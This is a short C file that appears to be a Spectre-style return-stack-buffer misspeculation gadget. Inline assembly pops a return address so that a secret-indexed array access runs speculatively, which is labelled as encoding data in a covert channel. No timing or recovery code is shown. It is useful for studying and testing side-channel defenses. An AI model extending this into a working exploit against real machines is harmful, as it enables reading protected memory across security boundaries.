
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


// inaccessible secret
#define SECRET "INACCESSIBLE SECRET"

unsigned char data[128];
uint8_t secretarray[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
int idx;
int temp = 0;
// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  asm volatile("pop %%rax\n" : : : "rax");
  return 0;
}

int __attribute__ ((noinline)) call_leak() {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  temp &= data[secretarray[idx]];
  return 2;
}

int __attribute__ ((noinline)) call_start() {
  call_leak();
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  call_start();
  call_leak();
  call_manipulate_stack();
}
